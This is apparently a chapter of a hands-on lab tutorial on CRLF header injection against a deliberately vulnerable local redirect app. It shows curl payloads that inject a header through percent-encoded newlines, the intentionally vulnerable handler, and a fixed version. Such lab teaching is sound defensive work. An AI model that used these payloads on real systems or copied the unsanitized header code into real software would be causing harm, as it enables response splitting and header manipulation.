# 03: Finding the Bug

## Probe the redirect endpoint

Start the lab and fetch the root to see what endpoints exist:

```
$ curl -s http://127.0.0.1:8096/
{"app":"CorpRedirector","endpoints":["GET /redirect?url=...","GET /safe-redirect?url=...","GET /check-injection","GET /admin"]}
```

Try a normal redirect:

```
$ curl -si http://127.0.0.1:8096/redirect?url=/home
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.12.x
Date: ...
Location: /home
```

The Location header value is exactly what we passed in `url`.

## Test for CRLF acceptance

Try injecting a literal `\r\n` by sending the percent-encoded form `%0D%0A`. Add a custom header after the newline:

```
$ curl -si 'http://127.0.0.1:8096/redirect?url=/safe%0D%0AX-Injected%3A%20hacked'
HTTP/1.0 302 Found
Server: BaseHTTP/0.6 Python/3.12.x
Date: ...
Location: /safe
X-Injected: hacked
```

The response now contains `X-Injected: hacked` as its own header. The server wrote the unescaped value directly into the header block, and the CRLF split it.

## Understand what the server does

Looking at the vulnerable code in `lab/app.py`:

```python
elif path == '/redirect':
    url = qs.get('url', '/')
    # VULNERABLE: passes url directly to send_header without sanitizing newlines
    self.send_response(302)
    self.send_header('Location', url)
    self.end_headers()
```

`qs.get('url', '/')` returns the URL-decoded string. `send_header` writes it verbatim to the socket buffer. There is no call to `str.replace('\r', '')` or any other sanitization.

## Compare with the safe endpoint

The same request to `/safe-redirect` strips the CRLF before writing the header:

```python
elif path == '/safe-redirect':
    url = qs.get('url', '/')
    # FIXED: strip CR and LF before setting the header
    safe_url = url.replace('\r', '').replace('\n', '')
    self.send_response(302)
    self.send_header('Location', safe_url)
    self.end_headers()
```

The same payload against `/safe-redirect` returns `Location: /safeX-Injected: hacked` as a single value with no extra header created.
